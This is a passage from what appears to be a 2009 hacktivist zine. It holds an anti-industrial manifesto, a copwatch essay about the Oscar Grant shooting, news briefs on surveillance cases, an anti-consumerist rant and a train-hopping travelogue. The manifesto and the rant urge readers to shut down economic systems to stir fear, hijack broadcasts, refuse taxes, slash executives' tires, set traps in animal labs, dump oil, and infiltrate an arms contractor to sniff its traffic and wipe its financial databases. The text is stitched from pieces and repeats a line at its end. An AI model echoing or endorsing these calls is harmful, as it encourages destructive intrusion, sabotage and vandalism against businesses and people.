time we have been seduced and bamboozled by \r\ntheir promised life of luxury and freedom through their technology, and all we \r\nhave is a world spinning towards extinction so that a few corporate executives \r\ncan profit. We are facing a global crisis, and the problem lies deeper than \r\nwhich political party is cracking the whip. No amount of reform or institutional \r\nchange through their political process can address the roots of the problem. No \r\n'newer, better, greener' technology can solve the problems technology itself has \r\ncreated. It is for this reason we must reverse the direction of the machine - \r\nfrom controlling and enslaving to freeing and liberating - and use technology to \r\ndestroy it's master, the Industrial Beast.\r\n   \r\nThe Role of the Hacker \r\n\r\nThe role of the hacker is to exploit the system's internal contradictions and \r\nturn them against itself - to stop the Ruling Classes from using technology to \r\ncontrol us, and instead return technology back to the people to fight for \r\nfreedom, justice, and equality. We must crack, break, and subvert the Machine \r\nand reverse it's direction. \r\n\r\nThe ruling classes know that whoever controls technology has power, which is why \r\nthey try to limit access to computers and technology. It is not a secret that \r\nthose who have access to technology and training are generally limited to the \r\nmiddle and upper classes, ensuring that only those who are comfortable with the \r\nstatus quo hold all the keys. They do not want the unwashed masses to have the \r\nsame access to manipulate technology; rather, they seek to manipulate the \r\nunwashed masses _by_ technology. \r\n\r\nIt is ironic that hackers, hacking an unusual amount of power over technology \r\nand possessing the ability to shut down the machine, generally belong to the \r\nprivileged classes and may have little interest in changing the status quo and \r\nwill likely be satisfied by being quietly filed into one of the many computer \r\njobs available in the Establishment. This is not always the case, as hackers are \r\noften prodigies who live unconventional lives and whose values may reflect a \r\ndeeper perspective on society.\r\n\r\nAs they grow older, aspiring hackers are forced to decide what they want to do \r\nwith their skills and are generally pulled into three broad directions:\r\n\r\n   (1) They sell out to Corporations security firms, or Government and try to\r\n   make a buck by giving away all the secrets and tricks of the trade as a\r\n   \"security consultant\". These \"white hats\", or \"sellouts\", whore their skills\r\n   to the Establishment and help protect the infrastructure of the Industrial\r\n   Beast, whether they consciously realize it or not.\r\n   \r\n   (2) Other hackers have different motivations. They are scammers, defrauders,\r\n   graffiti artists, also trying to make money or a name for themselves, or are\r\n   simply just hobbyist hackers. This is a broad group, but are generally\r\n   apolitical and have no loyalties or ideologies and act as a rogue. Although\r\n   they are popularly called \"black hat\" or \"grey hat\", they often share the\r\n   same motivations as white hats (money and fame), but use different means to\r\n   accomplish this.\r\n   \r\n   (3) The third category are Hacktivists who take a principled stand and use\r\n   their skills not to benefit themselves but to support social justice\r\n   struggles, fighting for freedom, equality, and social justice, and a return\r\n   back to a state of harmony with the earth.\r\n   \r\nGenerally speaking, whichever category one ends up in is mainly dependent on \r\nwhich socio-economic class you belong to or support. However, considering the \r\nplanetary crisis we face caused by the Industrial Beast, lines are being drawn \r\nand it is becoming increasingly necessary to decide which side you are on.\r\n\r\nIt is the Duty of Hackers to use their skills and privilege to use technology \r\nagainst the Industrial Beast. It is up to us hackers to realize who the real \r\nenemy is - and to point our technological guns in the right direction.\r\n\r\nUsing Technology to Subvert the Industrial Beast\r\n\r\nBecause the ruling classes try to restrict access and training to technology to \r\nthe privileged classes, simply making these resources available can be a \r\nrevolutionary act. Community centers can be set up with free internet access to \r\ntrain people how to use computers, and also to build and repair computers from \r\nspare or discarded parts to be distributed free of charge.\r\n\r\nIn addition, our duty is to get everyone we know to stop supporting the Beast in \r\nany way. Don't make it easy for them to track you, or hold any kind of power \r\nover you. If all of us were able to completely refuse to participate in their \r\nNumbers Racket, they would be completely powerless. Remember, although they have \r\ntricked many people into thinking it is impossible to survive without them, we \r\nstill hold all the real power because they depend on us for all their manual \r\nlabor and work, so if we teach ourselves how to survive on our own and refuse to \r\nparticipate, they are doomed.\r\n\r\nSome ways to Unplug and live Off the Grid:\r\n   * refuse to use bank accounts, credit cards, checks, loans\r\n   * refuse to pay taxes; work under the table if you can\r\n   * refuse to drive a car, ride a bike instead\r\n   * refuse to purchase goods from their stores or watch TV\r\n   * learn to grow your own food, clean your own water, make and fix your own \r\n   clothes, and don't be afraid to live in the wild\r\n   * _self-sufficiency is the answer_ \r\n\r\nBecome self-sufficient so you can survive on your own without their 'help' cuts \r\noff all the power they have over you. We can build our own communities and live \r\nfree on our own (i.e Temporary Autonomous Zone). But until everyone else is free \r\nand stops supporting the Machine, it will continue eating up everything in it's \r\npath ('manifest destiny'). So 'passive resistance' may not be enough to stop it.\r\n\r\nFortunately, it does not take much for a hacker to deal crippling blows against \r\nthe Machinery of Capitalism. Everyone, especially hackers, knows there are \r\nweaknesses in every system, everything is fallible, and that the more complex a \r\nsystem is, the more places there are to stick the dynamite. These days, \r\neverything is interconnected through networks and databases. The Industrial \r\nBeast is not some faceless monolith; there are specific corporations, \r\ngovernments and individuals responsible for the world's wars and ecological \r\ndisasters.\r\n\r\nIt is not hard to imagine some of the ways we can throw a monkey wrench into the \r\nmachine. Some ideas:\r\n   * Hijack radio, TV, and websites to broadcast messages encouraging a\r\n   revolution, an end to capitalist wars, and shutting down prisons\r\n   * Shut down economic systems, creating incidents to stir fear\r\n   * Expose vulnerabilities in election systems to reveal their fraudulent\r\n   nature, and to encourage Direct Action\r\n   * Expose internal communications of corrupt institutions and state secrets\r\n   * Shut 'em down!\r\n\r\nFrom whichever angle you attack the Beast, it must also be in coordination with \r\non-the-ground protests, marches, and educational campaigns so the media cannot \r\ntwist it around and call us terrorists. The people must understand and agree \r\nwith the cause.\r\n\r\nIn addition, alternatives to Industrialism must be made available, such as \r\nself-sufficient communes, worker collectives, etc - to function once the \r\nIndustrial Beast collapses. These must be created through direct democracy, \r\ncollective decision making, autonomy and non-hierarchical processes, embracing a \r\ngift-economy instead of a privatized competitive market, or else our new society \r\nmay fall victim to the same mistakes as that of the Beast.\r\n   \r\nAs the global crisis intensifies over the next few years, the major \r\nindustrialized nations will soon be 'running on empty' and may resort to \r\ndrastic, unpredictable actions to stay in power. It's no secret that the Titanic \r\nis sinking. The time to Abandon Ship is now.\r\n\r\n    Run, Comrades, the Old World is Behind You!\r\n\r\n\r\n################################################################################\r\n# 9. Oscar Grant and Copwatch 2.0                                  by Flatline #\r\n################################################################################\r\n\r\nOn January 1st 2009, Oscar Grant was murdered in cold blood by members of the \r\nbay area rapid transit police dept.  Oscar Grant is not the first person to be \r\nthe victim of a police murder, and he will certainly not be the last.  But the \r\ncase of Oscar Grant is unique, it is different than any other police murder yet \r\nand it heralds a new future.  The murder of Oscar grant is different because it \r\nwas witnessed by millions of people.\r\n\r\nOscar Grant was shot in the back by johannes mehserle, but Grant was not alone, \r\nmany people were around him and at least two of them had cell phone cameras and \r\ntaped the whole thing, and then hours later, it was uploaded to you tube, for \r\nall the world to see. These people were (probably) inadvertently participating \r\nin copwatch.  Copwatch is the idea that to keep police honest and to keep the \r\ncitizenry safe, people must follow the police, go where they go, and document \r\nwhat they do. Preferably with video evidence.  Now I am the first to say that \r\nterms like 'web 2.0' and 'social networks' are just marketing fluff; but after \r\nwitnessing the aftermath of this particular police murder, I feel that You Tube, \r\ncamera phones and social networks (basically summed up as the ability to create, \r\npublish and share media nearly instantly) can herald in a wonderful new era of \r\ntransparency for law enforcement and a wonderful new age for copwatch.  \r\n\r\nThe main problem with Copwatch perviously (from my experience) was that the cops \r\nwould always take your video camera or destroy the tape once they saw you \r\nrecording them.  You Tube and cellphone networks alleviate this problem by \r\nallowing you to pretty much instantly send a copy of the video to at least one \r\ntrusted friend if not more.  That friend can then instantly upload the video and \r\nspread it around far and wide.  Information dissemination on this wide a scale \r\nhas never before been possible.  \r\n\r\nI postulate that without the power of services like YouTube and video messaging, \r\nmehserly would have never been punished for the killing of Grant, protests and \r\nriots never would have happened because the information never would have spread \r\nso far and wide and people would not have been so enraged without witnessing \r\nthis atrocity first hand.  The pressure from the riots, protests, first hand \r\nvideo and the sheer number of people that witnessed this act was what forced \r\nBART's hand into prosecuting Mehserle.  If not for that Oscar Grant would be \r\njust another statistic.\r\n\r\nA new model of CopWatch is needed, one which utilizes the ability to instantly \r\ncreate and distribute media to its fullest potential.  These days video \r\nrecording phones can be had for cheap, possibly even free, and you tube is \r\nobviously a free service.  One could even start a copwatch clearing house for \r\npeople to upload all of there copwatch videos.  If we watch the cops all the \r\ntime, and make them know that they are going to be held responsible for there \r\nactions in the eyes of the public, we may be able to prevent another police \r\nmurder from happening ever again.\r\n\r\n################################################################################\r\n\r\n                            anti-(c)opyright 2009\r\n\r\nyou are encouraged to reuse, reword, and reprint everthing in this zine as you \r\nplease. this includes: printing your own copies to distribute to friends and\r\nfamily, copying and pasting bits of text in your own works, mirroring electronic\r\ncopies to websites and file sharing services, or anything else you can think of-\r\n\r\n                !! without asking permission or apologizing !!\r\n\r\nElectronic copies of the zine are available free online at the Hack Bloc website \r\n(www.hackbloc.org/zine/).

Action is more\r\nimportant now than it ever has been. We should take pride in the fact that\r\ncomcast has been forced to respect net neutrality by the FCC and we should see\r\nthat as a significant and inspiring victory and keep taking action untill the\r\nlast entity trying to strangle our freedom has been toppled.\r\n\r\nWe hope that our sixth communique will help you in your struggle.\r\n\r\n                                         --The HackBloc Collective\r\n\r\n################################################################################\r\n Stagnant News                                                    News in Brief\r\n################################################################################\r\n\r\nMIT Hackers Censored, Harassed by Unconstitutional Court Rulings\r\n--------------------------------------------------------------------------------\r\nAug 11, 2008: Three MIT hackers Zack Anderson, RJ Ryan, and Alessandra Chiesa \r\nwere sued in federal court and questioned by an FBI agent regarding their\r\nanticipated presentation at the DEFCON 16 conference detailing their research\r\ninto the Massachusetts Bay Transit Authority (MBTA) transit cards. Federal Judge\r\n Douglas P. Woodlock held a special weekend session to grant an injunction\r\nillegally preventing the three from speaking or releasing any details on their\r\nresearch (despite the fact that their slideshow presentation was already on the\r\nnet and the DEFCON CDs being distributed to conference attendees). The students\r\nattempted to notify the MBTA ahead of time to inform them of their\r\nvulnerabilities, but it was likely advertising \"free subway rides for life\" at a\r\n conference full of federal agents and white hat corporate sellouts which\r\nprompted the legal harassment. The EFF is representing the students.\r\n\r\nTelecommunication Companies granted Retroactive Immunity for Illegal NSA Wiretap\r\n--------------------------------------------------------------------------------\r\nJuly 9, 2008: Congress passed the FISA Amendment Acts, which in addition to\r\ngiving law enforcement broader powers in their warrantless surveillance programs\r\n also gives Retroactive Immunity to companies who have secretly cooperated with\r\nthe NSA in setting up wire taps to monitor the communications of U.S. citizens.\r\nIn particular, this bill is intended to drop all the lawsuits that have been\r\nfiled against corporations (such as Hepting v. AT&T) for their illegal\r\nsurveillance and turning over of private information to the Feds.\r\n\r\nMaking the immunity ‘retroactive' is essentially admitting guilt that they've\r\nbeen breaking the law with their unconstitutional monitoring program, and are\r\nnow just trying to cover their asses and prevent any sort of open discussion in\r\ncourt. What is most disturbing about this is not that the President authorized\r\nthis secret NSA wiretap program before 9/11 happened, but that the Democrats\r\nhave rolled over and approved every single bill the Republicans have been trying\r\nto push, even though they have the majority in Congress.\r\n\r\nhttp://www.eff.org/issues/nsa-spying\r\n\r\nInternet Archive Successfully Challenges FBI Subpoena\r\n--------------------------------------------------------------------------------\r\nMay 7, 2008: The FBI was forced to withdraw a National Security Letter against\r\nthe Internet Archive (archive.org) after site founder Brewster Kahle, the EFF\r\nand the ACLU filed a lawsuit challenging the subpoena. The NSL called for a\r\nparticular user's private information including name, address, length of service\r\nemail header information, and activity logs and also agged the site founder from\r\ndiscussing the subpoena because it was \"relevant to an ongoing, authorized\r\nnational security investigation\", FBI Asst. Director John Miller commenting on\r\nthe case. Site founder Kahle stated, \"We see this as an unqualified success ...\r\nthe goal here was to help other receipients of NSLs ... understand that you can\r\npush back on these.\"\r\n\r\nhttp://www.eff.org/press/archives/2008/05/06\r\n\r\nHomeland Security Chief Defends Seizing Laptops at Airports Without a Warrant\r\n--------------------------------------------------------------------------------\r\nAugust 6, 2008: In a Wired.com interview, DHS Chief Michael Chertoff states he\r\nis \"concerned about denial-of-service attacks\", but apparently is not concerned\r\nabout unconstitutional seizures of laptops at airports. If someone is \"entering\r\nthe country with an encrypted laptop ... and that individual refuses to\r\ncooperate by providing a password ... then the laptop could be seized and\r\nde-encrypted.\" The interview is revealing of DHS priorities and strategies in\r\ndealing with cybersecurity. In related news, National Cyber Security Center\r\ndirector Rod Beckstrom spoke at DEFCON 16 calling computer hackers\"one of the\r\ngreatest threats we face today in cyberspace\", making a comparison to Benedict\r\nArnold, famous traitor during the American Revolution'.\r\n\r\nhttp://blog.wired.com/27bstroke6/2008/08/chertoff.html\r\n\r\nEFF Launches \"Coders' Rights Project\"\r\n--------------------------------------------------------------------------------\r\nThe Electronic Frontier Foundation announced the Coders' Rights Project at the\r\n2008 Blackhat convention. It's stated goal is to work to \"protect researchers\r\nthrough education, legal defense, amicus briefs, and involvement in the\r\ncommunity ... protecting innovation and safeguarding the rights of curious\r\ntinkerers and hackers on the digital frontier\". Currently on the project's\r\nwebsite are several papers analyzing the legal aspects of vulnerability research\r\nas well as active cases the EFF is working on.\r\nhttp://www.eff.org/issues/coders\r\n\r\nRiseUp.net Announces \"Freedom Summer of Code\"\r\n--------------------------------------------------------------------------------\r\nRiseUp.net is calling for proposals for new tech-activist projects as well as\r\nsoliciting programmers to help with development.\r\n\r\n\"Do you want to be compensated for inspiring and meaningful work this summer /\r\nwinter?

We have bigger houses, but a smaller\r\ncircle of friends. We have more degrees, but less commonsense. More knowledge\r\nbut less fair judgement, more experts yet more problems. We've added years to\r\nour lives, without living them, We've done larger yet more meaningless things.\r\nWe claim to live in a free world and are assured constantly the world is kept\r\nsafe. Yet we are supposed to trade that same freedom for this \"security,\" We\r\nhave more strategic alliances, yet less friends. We multiplied our possessions\r\nbut reduced our values. We learned how to make a living, but forgot how to make\r\na life, We paved paradise, and put up a parking lot. We hunted entire species\r\ninto near extinction, only to keep the last few in a zoo. We don't make friends,\r\nwe cul- tivate \"business relations\"; Nobel ideals have made place for what is\r\ncalled common sense, and realism, yet we are still prepared to believe in lies\r\nbigger than the naivety of any ideal, all for the sake of maintaining the status\r\nquo. Cruelty and injustice, intolerance and oppression, do you truly not care or\r\nare you afraid to care? Because, if you don't care about the misery inflicted\r\nupon this world for the gain of the few, aren't you exactly the same kind of\r\nmonster you believe the people you hold your prejudices against to be? If you do\r\n however, why don't you show some care? Are you afraid of the social reaction?\r\nOr are you afraid to see the truth? For the truth is that the extortionists, the\r\noppressors, the rulers who oppress the masses and squeeze the life out of them\r\nwhere elected in most cases, or at least accepted. Who elected them? Who\r\ntolerated their rule? Who chose their modern-day Nero or Caligula?\r\n\r\nIf you're looking for the guilty, you need only look into a mirror, I know why\r\nyou did it. I know you were afraid. War, terror, disease, fanaticism, It\r\ncorrupted your common sense, your free will. You chose ignorance over truth. You\r\nchose conformism over expression. You chose security over freedom. You were\r\npromised order. You were promised peace. You were promised progress. And all\r\nthat was demanded in return was your silent, obedient consent. And they couldn't\r\nbe wrong, now could they? After all, they got \"democratically\" elected. They\r\nstood for progress and peace, your great leaders, your politicians, your\r\npriests, your captains of industry, your gods.\r\n\r\nThen why do so many suffer I ask you. Why do so many of these leaders indulge in\r\nblatant over consumerism, while the majority of the world's population barely\r\nhas enough food to make it through the day. Why did your gods betray you and the\r\nideals you believed they stood for? Did it make you, the common man in the\r\n\"first world\", happier? From the beginning, when man struggled with nature, not\r\nknowing where he might sleep, what he would eat, whether he would survive to see\r\nthe light of dawn again, there have always been those who would lord over\r\nothers. The People that believe that by some unseen right they are granted power\r\nover oth- ers, and would push others down so that they might climb, are the\r\ngreatest threat to mankind's existence. For many years has one man or one race\r\nprospered on the sweat and work of others. With every new leader you hoped for a\r\nbetter world, a new tomorrow, a golden dawn, you big chance in the play that is\r\nhuman history. You traded your Pharaohs for Caesars, your Emperors for party\r\nleaders, your kings for captains of industry, hoping for that small glimmer of\r\nfreedom, a chance to escape the cycle. But you neglected, you didn't bother, you\r\nassumed that another leader, a replacement would succeed where the former tyrant\r\nhad failed. Instead of waking up and realizing that the suppressing nature of\r\nauthority, the substitution of autonomy and sovereignty with conformism is what\r\ntruly kept you down, you allowed yourself to be cuddled asleep by the soothing\r\nwords of the tyrants, after all, this was the best solution no? All other\r\nsolutions where just idealism and non-realism, no? For obviously, you must have\r\neverything your heart desires, for what else would one desire but expensive\r\ncars, big houses and fame? That is what you aim for, no?\r\n\r\nLet me ask you a question. Do you enjoy your life? Did you wake up today and\r\nwish for tomorrow, a better day where you will appreciated? You don't live, you\r\njust scratch on day to day work, Commute, Sleep, Work, Commute, Sleep, A\r\nseemingly endless, forced cycle of social conformism. All we're waiting for is\r\nsomething worth waiting for. You learn what you already know, become what you\r\nalready are. You waste waste the best 40 years of you life, to afford the last\r\n20 of them, wasting away in some god-forsaken home for the elderly, forgotten by\r\nthe society you helped create, ignored by the leaders you brought to power and\r\nneglected by the children you spawned. After all, they are just like you, and\r\nare too busy being self-made people, reaching for the top to care for someone\r\nwho's economic usefulness is virtually absent, save for being a consumer,\r\nwe're mindless ants, consumers, by products of a commodity fetish. Poverty, war,\r\ninjustice, Profit-driven wars, freedom of expression is not what concerns us,\r\nwhat concerns us are fancy human-interest magazines, television with over 400\r\nchannels, luxury cars, cheap and fast takeaway meals, a huge fucking house,\r\nelectrically-operated sexual devices, Rolex, KFC, Mercedes, Nike, MTV, Chrysler,\r\nMcDonalds', G-star, Dell, Geox, Toyota now THAT concerns us. Love, success,\r\nhappiness, art, knowledge and even charities have all become a branded,\r\nforce-fed product, bought for no other reason than the inability of the masses\r\nto cope with media-induced consumerist intoxication. \r\n\r\nWhat else is there to life but this? Nothing, after all, it's all on television,\r\nall right there, look in awe, listen, forget today's misery, kneel, pray for\r\nsalvation and hope that one day you will be among the stars and role-models fed\r\nto you trough mass-media, that one day you will be adored, only to mindlessly\r\nindulge in consumerism for no other reason than to radiate an image of social\r\nacceptance. You claim to be comfortable and happy with your rabid consumerism\r\nyet why do you suffer from burn-out and a condition near to existential despair?\r\nFor what purpose do you live? To become wealthy or famous? You think you ever\r\nwill be? And what if you succeed? Tell me why nowadays people know the price of\r\neverything and the value of nothing.\r\n\r\nEvery image you watch on that television, every sitcom, every news bulletin is\r\nanother second off your life, never to return,wasted in a state of mindless\r\napathy towards your mortality. Do you know how long you live? Do you realize\r\nthat any moment it could end as abruptly and senselessly as it begun, just like\r\nthat? Don't you have other things to do? Is your life so fucking empty and\r\nmeaningless that you honestly can't think of a better way to spend these moments\r\nthan to waste away in solitude and consumerism? Or are you so intoxicated by\r\nsocial conformism that you adhere to a set of standards ,installed by a social\r\nclass you don't belong to, to make you indulge in mindless consumerism for the \r\nbenefit of the elite? Are you so afraid of stigma and social rejec- tion that\r\nyou simply ignore the choice to break this cycle? Is the only reason you're\r\nstill alive because someone decided to let you stay alive, because you still\r\nhave \"a job to do\" or yet \"have to make it\" in life? Is the only reason you\r\ncontinue from day to day because you're waiting for \"your moment\". Your fucking\r\n15 minutes of fame, your moment of immortal glory. Don't you realize that your\r\ndreams of riches and fame are soap-bells created by the elite to keep you down?\r\nYour American Dream is exactly what it says, a dream. Tell your what, you WON'T\r\nbe a popstar, you WON'T be a famous writer, you WON'T be a leading CEO. You'll\r\nprobably end up in a fucking small gray cubicle, processing information that is\r\nnone of your concern for a fee just enough to stay alive and rent your small\r\napartment. You'll owe people so much money you aren't broke, but broken. You\r\nwon't even be able to afford to pay attention.You'll work on day-to-day, waiting\r\nfor that tiny promotion, and when the chance occurs, you'll have to push others\r\ndown to climb.You'll have nothing sensible to say, but hey, you can say it in\r\nfive fucking languages and are certified to do so as well.Not because you're\r\nincompetent or stupid, but simply because you're waiting for your promotion,\r\nyour \"chance in life\", instead of looking for an alternative to this apathetic\r\ncycle. And after years of waiting, you realize that all you've done, all you've\r\nbeen, all you've ever wanted to be was a tool, a simple instrument to generate\r\nmore profit for the select group of elite, the bourgeois who control the means\r\nof production and squeeze you for every last penny, the group you're dying to\r\nbelong to, but will never be part of. The agony caused by this subconscious\r\nknowledge leads to a lot of frustration in this world, to apathy towards true\r\nsuffering, like that of the hungry or that of those under repression or in the\r\nmiddle of a war that is none of their concern.All your life dreams that have\r\nbeen fed trough television and marketing are just created to keep you subdued as\r\nan underling.Let's stop praying for someone to save us and start saving\r\nourselves.Let's stop this and start over.You are more than the sum of what you\r\nconsume. \r\n\r\n               YOU ARE NOT YOUR JOB\r\n      YOU ARE NOT YOUR FUCKING BIG TELEVISION\r\nYOU ARE NOT THAT WASHING MACHINE OR YOUR HUGE CAR\r\n\r\nBreak the cycle, don't go for the career of mindless drudgery, express yourself,\r\nreprint, reword, and reuse copyrighted material, shut down major intersections\r\nin the business district, deface billboards, storm execu- tive offices, social\r\nengineer some food and give it out to people on the street, crash political\r\nparty conventions, throw paintbombs around in the business district, set up\r\ntraps in animal testing labs, cause mayhem at politi- cal congresses,occupy bank\r\nbuildings, circulate large amounts of fake cash at McDonalds, spray paint SUVs,\r\nsabotage major economic conferences, dump large amounts of unprocessed oil near\r\nshell executive buildings, Slit tires of cars of major executives, go on an\r\nadbusting spree and give the city back to the citizens, remove corporate\r\nmultinational intoxication from everyday life, get hired as a waiter at major\r\nmultinational CEO and financial congresses and take the food to the streets and\r\ndistribute it among the poor, get hired as a phone call connector in a major\r\nbank and connect every call to the wrong person, get hired as a network\r\nadministrator for a major arms contractor, sniff their traffic, make sensitive,\r\nincriminating information public and wipe their financial databases afterwards.\r\nBy actions which compel general attention, the notion that they are not\r\npowerless seeps into people's minds and gives them the opportunity to reclaim\r\ntheir freedom. One such act may, in a few days, wake up more people than\r\nthousands of pamphlets. Think you can't make a difference? Think again. You cook\r\ntheir meals, haul their trash, write their software, connect their calls, drive\r\ntheir ambulances, wash their cars, pump their gas, teach their kids operate\r\ntheir networks and guard them wile they sleep. \r\n\r\nThey DEPEND upon you more than both you and they know, more than they WANT you\r\nto know. Once you realize this, your potential, the fact that you don't NEED\r\nthose leeches on top, those tyrants, you can work towards freedom, TRUE freedom,\r\nnot the bogus freedom- promised by so many. If you don't claim your life to the\r\nfullest you will become a statistic. Do you realize that your life is a precious\r\ngift, given only once like this, that you are spending most of it doing things\r\nthat are none of your business? If you where to die tomorrow, what are you going\r\nto do today?Why aren't you doing it already? Afraid you don't fit in? Afraid of\r\nthe reaction? \r\n\r\n################################################################################\r\n Hacking Freight Trains part 2  by Haifleisch\r\n################################################################################\r\n\r\nAround sunset we headed out to the Oakland train yard and wandered down past the\r\nbend to where the overpass comes down to meet the ground. Evoltech insisted we\r\nsit down against a pillar and rest because our bags were dragging us down. We\r\ndidn't see a train for hours so eventually we pulled out our blanket and fell\r\nasleep.\r\n\r\nI jolted awake to him jumping up and pulling the blanket off of me a train...\r\nflatcars. Not our first choice, actually the one I specifically didn't want to\r\ntake; too exposed and nowhere to sleep, but, when a decent looking 48 came into\r\nsight, we grabbed our packs and ran for it. Delirious from being awakened from a\r\ndeep sleep, I ran along side the car and grabbed the handles on either side of\r\nthe ladder, and then looked down. The first ladder step was high, requiring a\r\nleap. It was hard to navigate while the train was moving. I could see myself\r\nmissing the step, my lower body swinging under where the wheel was ready to take\r\noff my foot. I panicked and let go.\r\n\r\n\"I couldn't do it\", I said, my heart racing. I was ready to try again, but there\r\nwere no more rideable cars. The train passed and we went back to our spot\r\nfeeling like we might have a chance of catching out that night. That was our\r\nfirst train in the right direction and it was 2 in the morning. A few minutes\r\nlater an auto consist passed, but there's nowhere to ride an auto consist. We\r\nsat back down and fell immediately back to sleep, but lighter. An hour later we\r\nwoke up to the scanner chirping, \"HERE WE GO!\"\r\n\r\nWhen another train came along Evoltech called it in on the UP tracking number.\r\nIt was our hot shot to Ill. He ran to catch the train, and stepped up onto the\r\ntracks at the same time I spotted a train coming the opposite direction towards\r\nus. They are amazingly quiet until they are right on top of you. I grabbed him\r\nright before he stepped out in front of it. We waited anxiously for it to pass,\r\nwatching our train creep along on the other side. Thankfully the other train was\r\na short one and once it passed we ran for ours. This train was moving very\r\nslowly,making it easy to catch. We waited for an inter-modal car with a decent\r\nsized platform that was blocked from the wind. Once we found the car we wanted\r\nwe realized the train was stopping, then we noticed the headlights of a yard\r\nworkers 4 wheeler. Luckily, right in front of our car was a pillar with a bush\r\non the other side which gave us perfect cover. We inched around, hiding from the\r\n4 wheeler as it drove past. \r\n\r\nThe train sat for a long time. We sat between the bush and the pillar eating\r\ndried mangoes and watching peeper frogs. Evoltech had found a inter-modal 48\r\nthat had a solid drop in the bottom so we could lie down, avoid being seen, and\r\nnot have to hold on for dear life.\r\n\r\nAround sunrise we started to wonder if our train was ever going to leave. Then\r\nwe heard the brakes release. The sound of the trains are far less distinct then\r\nthe books [1] we read suggested. Evoltech shot me a mischievous grin and we\r\nhopped on. We waited for the train to clear the Am-track station, and then made\r\nourselves a cozy bed and curled up and fell fast asleep.\r\n\r\nWe woke up around noon and spent a few miserable hours pressed into a half foot\r\nof shade on one wall of the train car, trying to escape the blazing afternoon\r\nsun, while the train picked up more cars in Sacramento. Later that day we rode\r\nthrough Donner Pass. Evoltech and I stood at the edge of the car wishing that we\r\ncould jump in the water of the river below. I was so thirsty and knew our water\r\nwould be gone soon. I remembered hearing they were hard on hobos in Reno, NV,\r\nand knew that it might be our next stop and only chance to get water for a\r\nwhile. While riding a locomotive the noise is deafening. It surrounds you,\r\nvibrating through your body. The train feels like some giant ancient beast that\r\nthe railroads have managed to tentatively wrangle.\r\n\r\nSleeping at night was not easy. We layered up early but it was not enough. Every\r\npart of our bodies that touched the train was chilled and wouldn't warm up. The \r\nprevious tenant of the car had left a plastic tomato box which we used to pee\r\nin. Last night that box made its way around the car squeezing in between us and\r\nonce nestling by my head. Coming through the mountains that night every inch of\r\nthe sky was lit by stars.\r\n\r\nSomewhere in the middle of the night I woke up to the cars crashing together\r\nviolently and then felt the train moving as if it had no breaks. I wondered if\r\nwe were in a humping yard. In a humping yard trains are taken apart and\r\nreconnected, guided down sloping tracks, joining the car in front of them by\r\nslamming the connectors of the two cars together. It isn't a safe place to be on\r\na car to say the least. Fortunately we weren't a hump yard and the yard workers\r\nwere just breaking off a few cars.\r\n\r\nSomehow we slept through Reno and woke around sunrise, when the train stopped in\r\nElko. With only a half liter of water left, we threw our packs over and started\r\nlooking for a spigot. We found one in front of a Swan's Ice Cream office. We\r\nfilled our water bottles and ran back to the train, but we were too late and it\r\npulled out seconds before we reached it.\r\n\r\nWe decided to walk to a store and get a few gallon jugs of water. The first\r\nplace we came across was a trailer park / casino with a store. We bought water\r\nand asked the counter woman questions about Elko She and the older man were very\r\nfriendly. She even offered us a complementary breakfast that was for guests\r\nonly. It was our first time off the train and we had been rolling in soot and\r\ndirt for what felt like days. We stuck out like sore thumbs in Elko. We got\r\nPopsicles and gobbled down the free doughnuts and headed back down to the tracks\r\nto wait for our train.\r\n\r\nThe only tree any where near the track was still to far from where the train\r\nstopped so we found a sage bush about three feet high and curled in the tiny\r\npatch of shade beneath it. We tried rigging up Evoltech's wool blanket to create\r\nmore shade but it was just as miserable, laying in the pokey brush in a 105\r\ndegree weather  with ants and horseflies attacking us. We hadn't seen a train in\r\na while and I was melting. Evoltech wanted to  stay put. I grew more and more\r\naggravated by the heat. Then a train came our way and we charged through  the\r\nsage brush. I jumped on a grainer barely holding on with one arm until Evoltech\r\nyelled \"no platform, no  platform!\" I jumped backwards off the ladder and my\r\npack threw me sideways and onto my elbows on the  rocks, scoring myself some\r\nmean road rash.\r\n\r\nThen the train stopped. We picked out a grainer and ducked back. Evoltech\r\nlistened to the scanner and deter-  mined that they were breaking the train up.\r\nWe got off and sat down in the bushes. I was starting to get heat  stroke. We\r\nwent back into town, to a super market where everyone stared at us. Evoltech\r\nwould say \"hello,  how are you\" and they would break their silent shock into a\r\ncordial smile. \"Fine how are you?\".\r\n\r\nI was so heat exhausted that we ended up catching a bus to Salt Lake City. In\r\nSLC we spent the day with my  brother. The next morning we woke up extra early\r\nand he drove us back to the tracks not far from the grey-  hound station. We\r\nfound a area under the over-pass between three lines where it looked like the\r\ntrains were  slowing down and waited there for hours, missing train after train\r\nbecause they were going too fast. A slightly off-his-rocker and down-on-his-luck\r\ndude came by and chatted us up for a while. He tried to offer us help, a  place\r\nto stay, a possible job, even insisted Evoltech take 3 dollars. Then a UP\r\nofficer came along and gave us  the friendliest warning to move along we've ever\r\nhad... Mormons. We decided it was time to leave and walked  down town. We spent\r\nthe three dollars earned on ice cream and saw the pirates of the Caribbean at\r\nthe nearest air conditioned mall.  \r\n\r\nBack down at the tracks later that night things looked a little more promising.\r\nWe found a spot closer to the  yard. A group of hobos was already there and they\r\nwere friendly so we sat down. One was a gutter punk our age from MN and the\r\nother two, Willy and Mortikai, were seasoned hobos in their 30's.\r\n\r\nWilly and Mortikai passed on the train to California, because it was bound for\r\nColton. Apparently the Colton  yard is notoriously hellish. The two of them had\r\nbeen traveling together for three weeks. They were an odd  couple. Willy was an\r\nOkie, blond and lanky, who obviously grew up riding the trains. Mortikai was the\r\nsame age but big and loud; an aged hobo punk with the usual I've-been-punk-as\r\nfuck-since-I-was-born-stories- but  good ones. He had recently been released\r\nfrom jail for extreme eco-activism. The two of them knew every  train hopper and\r\ncrust punker there was. Mortikai's dog, Pascal, was also along for the ride.\r\nMortikai was still  recovering from a twisted ankle so they were only catching\r\nstopped trains. They worked as a team; Willy would  scout out a good car, then\r\nMortikai would pass up Pascal and climb on. They had a hobo story for every part\r\nof the country. This was supposed to be Mortikai's retirement run.  \r\n\r\nWe admitted this was our first time out. There was no fooling them anyways. They\r\nlaughed at our scanner and  calling in the trains on a cell phone. Mortikai said\r\nhe was going to write a song about Evoltech. Mortikai told  us about his one\r\ntrue love (not Shakira, who he was infatuated with at the moment), but a member\r\nof an all  female train hopping gang. 6 years ago on a rainy night he gave her a\r\nhand up on a freight car and her grip  slipped. She was pulled under the wheel\r\nand died. \"Man I loved that woman\", he said. \r\n\r\nWe admitted this was our first time out. There was no fooling them anyways.

